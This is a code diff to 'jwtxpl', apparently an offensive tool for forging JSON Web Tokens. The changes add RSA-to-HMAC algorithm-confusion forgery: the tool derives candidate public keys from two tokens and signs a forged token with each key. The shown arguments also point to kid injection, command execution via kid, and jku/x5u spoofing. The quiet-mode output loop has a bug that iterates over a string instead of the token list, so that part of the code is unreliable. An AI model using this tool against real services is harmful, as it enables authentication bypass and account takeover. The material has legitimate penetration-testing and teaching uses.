@@ -290,6 +290,7 @@ class Cracker:
             if Cracker.get_original_alg(self.compute_public_with.split(".")[0]) != self.alg:
                 print(f"{Bcolors.FAIL}jwtxpl: error: JWTs algorithm differs. Public key computation require two token, signed with the same key and the same alg{Bcolors.FAIL}")
                 sys.exit(6)
+            self.alg = Cracker.auto_alg_confusion(self.alg)
         """Validate key"""
         if not any(self.no_key_validation_args):
             """--manual can be used only with --jku-basic or --x5u-basic"""
@@ -558,10 +559,7 @@ class Cracker:
         """
         header_dict = json.loads(self.original_token_header)
         payload_dict = json.loads(self.original_token_payload)
-        if self.compute_public_with:
-            header_dict['alg'] = Cracker.auto_alg_confusion(self.alg)
-        else:
-            header_dict['alg'] = self.alg
+        header_dict['alg'] = self.alg
         commons_jwks_url_ends = ["jwks.json", "jwks", "keys", ".json"]
         if self.add_into:
             for item in self.add_into:
@@ -885,7 +883,7 @@ class Cracker:
         second_token_primitives = Cracker.get_primitives(self.compute_public_with, self.alg)
         prob_moduluses = Cracker.compute_moduluses(first_token_primitives, second_token_primitives, self.exponent)
         for n in prob_moduluses:
-            public_numbers = RSAPublicNumbers(self.exponent, n)
+            public_numbers = RSAPublicNumbers(self.exponent, int(n))
             public_key = public_numbers.public_key()
             self.computed_keys.append(public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode())
 
@@ -903,39 +901,46 @@ class Cracker:
 
         :return: The generated signature.
         """
+        signatures = list()
         if self.null_signature:
-            signature = ""
+            signatures.append("")
         elif self.unverified:
-            signature = self.token_dict['signature']
+            signatures.append(self.token_dict['signature'])
         else:
             sign_hash = Cracker.get_sign_hash(self.alg)
             try:
-                if self.alg == "None" or self.alg == "none":
-                    signature = ""
+                if self.compute_public_with:
+                    if not self.computed_keys:
+                        print(f"{Bcolors.OKCYAN}No public key computed{Bcolors.ENDC}")
+                        sys.exit(0)
+                    for key in self.computed_keys:
+                        signatures.append(Cracker.sign_token_with_hmac(key, partial_token, sign_hash))
+                elif self.alg == "None" or self.alg == "none":
+                    signatures.append("")
                 elif self.alg[:2] == "HS":
                     if self.key is None:
                         print(f"{Bcolors.FAIL}jwtxpl: error: key is needed with HS*{Bcolors.ENDC}")
                         sys.exit(4)
-                    signature = Cracker.sign_token_with_hmac(self.key, partial_token, sign_hash)
+                    signatures.append(Cracker.sign_token_with_hmac(self.key, partial_token, sign_hash))
                 elif self.alg[:2] == "RS":
                     if self.key is None:
                         print(f"{Bcolors.FAIL}jwtxpl: error: key is needed with RS*{Bcolors.ENDC}")
                         sys.exit(4)
-                    signature = Cracker.sign_token_with_rsa_pkcs1(self.key, partial_token, sign_hash)
+                    signatures.append(Cracker.sign_token_with_rsa_pkcs1(self.key, partial_token, sign_hash))
                 elif self.alg[:2] == "PS":
                     if self.key is None:
                         print(f"{Bcolors.FAIL}jwtxpl: error: key is needed with PS*{Bcolors.ENDC}")
                         sys.exit(4)
-                    signature = Cracker.sign_token_with_rsa_pss(self.key, partial_token, sign_hash)
+                    signatures.append(Cracker.sign_token_with_rsa_pss(self.key, partial_token, sign_hash))
                 elif self.alg[:2] == "ES":
                     if self.key is None:
                         print(f"{Bcolors.FAIL}jwtxpl: error: key is needed with ES*{Bcolors.ENDC}")
                         sys.exit(4)
-                    signature = Cracker.sign_token_with_ec(self.key, partial_token, sign_hash)
+                    signatures.append(Cracker.sign_token_with_ec(self.key, partial_token, sign_hash))
             except (TypeError, AttributeError):
                 print(f"{Bcolors.FAIL}jwtxpl: error: key mismatch. The key you passed is not compatible with {self.alg}{Bcolors.ENDC}")
                 sys.exit(2)
-        return signature
+        return signatures
 
     @staticmethod
     def inject_kid(payload):
@@ -997,6 +1002,9 @@ class Cracker:
          string given as input, only if necessary.
          If the string can't be decoded after the second equal sign has been appended, it returns an error.
         :return: A byte-string ready to be base64 decoded.
+
+        *** It's possible to simply do return string.encode() + b"=" * (len(string) % 4), but then every
+        *** base64 decoding operation should be placed in a try/catch statement
         """
         encoded = string.encode()
         final_text = b""
@@ -1884,13 +1892,15 @@ class Cracker:
             sys.exit(4)
         header, payload = self.modify_header_and_payload()
         new_partial_token = Cracker.craft_token(header, payload)
-        signature = self.select_signature(new_partial_token)
-        final_token = new_partial_token + "." + signature
+        signatures = self.select_signature(new_partial_token)
+        final_tokens = [new_partial_token + "." + signature for signature in signatures]
         ifprint(not self.quiet, f"{Bcolors.HEADER}Crafted header ={Bcolors.ENDC} {Bcolors.OKCYAN}{header}{Bcolors.ENDC}, {Bcolors.HEADER}Crafted payload ={Bcolors.ENDC} {Bcolors.OKCYAN}{payload}{Bcolors.ENDC}")
         if not self.quiet:
-            print(f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}")
+            for final_token in final_tokens:
+                print(f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}")
         else:
-            print(final_token)
+            for final_token in final_token:
+                print(final_token)
         if self.file is not None:
             self.file.close()
         self.devnull.close()
@@ -2041,7 +2051,7 @@ if __name__ == '__main__':
         args.token, args.alg, args.key, args.payload, args.complex_payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid,
         args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody,
         args.verify_token_with, args.subtract_time, args.add_time, args.find_key_from_jwks, args.compute_public_with, args.unverified,
-        args.blank, args.decode, args.manual, args.generate_jwk, args.dump_key, args.null_signature, args.quiet, args.exponent
+        args.blank, args.decode, args.manual, args.generate_jwk, args.dump_key, args.null_signature, args.quiet, args.public_exponent
     )
 
     # Start the cracker
